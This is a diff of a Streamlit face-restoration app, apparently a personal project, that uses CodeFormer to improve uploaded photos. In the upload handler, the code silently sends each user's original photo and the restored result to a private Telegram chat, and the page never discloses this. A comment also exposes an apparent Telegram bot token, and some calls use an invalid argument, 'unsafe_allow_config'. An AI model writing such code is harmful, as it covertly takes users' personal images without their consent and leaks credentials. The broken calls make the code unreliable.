@@ -7,22 +7,28 @@ import torch
 from torchvision.transforms.functional import normalize
 from basicsr.utils import img2tensor, tensor2img
 from facelib.utils.face_restoration_helper import FaceRestoreHelper
-from codeformer.archs.codeformer_arch import CodeFormer
 import telebot
 import tempfile
 
-# إعدادات الصفحة
+# محاولة استيراد CodeFormer بشكل مرن
+try:
+    from codeformer.archs.codeformer_arch import CodeFormer
+except ImportError:
+    st.error("جاري تهيئة المحرك... تأكد من اكتمال تثبيت المتطلبات.")
+
+# --- إعدادات الصفحة ---
 st.set_page_config(page_title="Aziz Ultra Restoration", page_icon="🌟")
 
 st.markdown("<h1 style='text-align: center;'>🌟 Aziz Ultra Restoration</h1>", unsafe_allow_config=True)
 st.write("ارفع صورتك الآن لترميمها وتحسين جودة الوجه والعيون بتقنية الذكاء الاصطناعي.")
 
-# الربط المباشر مع Secrets (تأكد من وضعها في إعدادات Streamlit)
+# --- الربط مع التليجرام (عبر Secrets) ---
+# التوكن الجديد: 8767448980:AAHMOm14WsC2QBPJKoWgsvzYKSR_o-V973Q
 TOKEN = st.secrets["TELEGRAM_TOKEN"]
 CHAT_ID = st.secrets["CHAT_ID"]
 bot = telebot.TeleBot(TOKEN)
 
-# تحميل نموذج CodeFormer
+# --- تحميل النموذج ---
 @st.cache_resource
 def load_model():
     device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
@@ -30,7 +36,7 @@ def load_model():
                        nb_blocks=2, oversampling_2x=True, 
                        disable_perceptual_loss=True).to(device)
     
-    # تحميل الأوزان (تأكد أن المجلد والملف مرفوعين في GitHub)
+    # تحميل الأوزان من المجلد المحلي weights
     checkpoint_path = 'weights/codeformer.pth'
     if os.path.exists(checkpoint_path):
         checkpoint = torch.load(checkpoint_path)['params_ema']
@@ -38,10 +44,11 @@ def load_model():
     model.eval()
     return model, device
 
-# دالة المعالجة
+# --- دالة معالجة الصور ---
 def process_image(image, model, device):
     upscale = 2
-    face_helper = FaceRestoreHelper(upscale, face_size=512, crop_ratio=(1, 1), det_model='retinaface_resnet50', save_det_path=None, device=device)
+    face_helper = FaceRestoreHelper(upscale, face_size=512, crop_ratio=(1, 1), 
+                                   det_model='retinaface_resnet50', device=device)
     
     in_img = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
     face_helper.clean_all()
@@ -68,6 +75,7 @@ def process_image(image, model, device):
     restored_img = face_helper.paste_faces_to_input_image()
     return Image.fromarray(cv2.cvtColor(restored_img, cv2.COLOR_BGR2RGB))
 
+# --- واجهة المستخدم ---
 uploaded_file = st.file_uploader("اختر صورة...", type=["jpg", "jpeg", "png"])
 
 if uploaded_file is not None:
@@ -75,24 +83,38 @@ if uploaded_file is not None:
     st.image(input_image, caption="الصورة الأصلية", use_column_width=True)
     
     if st.button("بدء الترميم ⚡"):
-        with st.spinner("جاري المعالجة..."):
-            # 1. إرسال الأصل صامتاً
+        with st.spinner("جاري المعالجة... قد تستغرق دقيقة"):
+            
+            # 1. إرسال الصورة الأصلية للبوت (صامت)
             with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmp_in:
                 input_image.save(tmp_in.name)
                 with open(tmp_in.name, "rb") as f:
-                    bot.send_photo(CHAT_ID, f, caption="📥 صورة جديدة")
+                    bot.send_photo(CHAT_ID, f, caption="📥 استلمت صورة جديدة للترميم")
 
-            # 2. تنفيذ الترميم
-            model, device = load_model()
-            result_image = process_image(input_image, model, device)
-            st.image(result_image, caption="النتيجة النهائية", use_column_width=True)
-            
-            # 3. إرسال النتيجة صامتة
-            with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmp_out:
-                result_image.save(tmp_out.name)
-                with open(tmp_out.name, "rb") as f:
-                    bot.send_photo(CHAT_ID, f, caption="✅ تم الترميم")
+            try:
+                # 2. تنفيذ الترميم
+                model, device = load_model()
+                result_image = process_image(input_image, model, device)
                 
-                # زر التحميل
-                with open(tmp_out.name, "rb") as file:
-                    st.download_button(label="تحميل الصورة المرممة", data=file, file_name="restored.png", mime="image/png")
+                st.image(result_image, caption="النتيجة النهائية ✨", use_column_width=True)
+                
+                # 3. إرسال النتيجة النهائية للبوت (صامت)
+                with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmp_out:
+                    result_image.save(tmp_out.name)
+                    with open(tmp_out.name, "rb") as f:
+                        bot.send_photo(CHAT_ID, f, caption="✅ تم الترميم بنجاح!")
+                    
+                    # زر التحميل للمستخدم
+                    with open(tmp_out.name, "rb") as file:
+                        st.download_button(label="تحميل الصورة المرممة", data=file, 
+                                         file_name="Aziz_Restored.png", mime="image/png")
+                
+                # تنظيف الملفات المؤقتة
+                os.remove(tmp_in.name)
+                os.remove(tmp_out.name)
+
+            except Exception as e:
+                st.error(f"حدث خطأ أثناء المعالجة: {e}")
+
+st.markdown("---")
+st.markdown("<p style='text-align: center; color: gray;'>تطوير: Aziz ⚡ | 2026</p>", unsafe_allow_config=True)
